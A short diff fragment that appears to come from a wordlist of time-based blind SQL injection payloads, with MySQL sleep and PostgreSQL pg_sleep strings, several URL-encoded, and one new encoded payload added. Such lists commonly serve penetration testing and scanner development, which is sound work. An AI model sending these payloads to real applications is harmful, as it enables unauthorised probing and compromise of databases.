@@ -10,3 +10,4 @@ if(now()=sysdate(),sleep(5),0)
 %%27;SELECT%20PG_SLEEP(5)--
 pg_sleep(5)
 %27|%20|pg_sleep(5)--
+%27%2B(select*from(select(if(1%3D1%2Csleep(5)%2Cfalse)))a)%2B%27
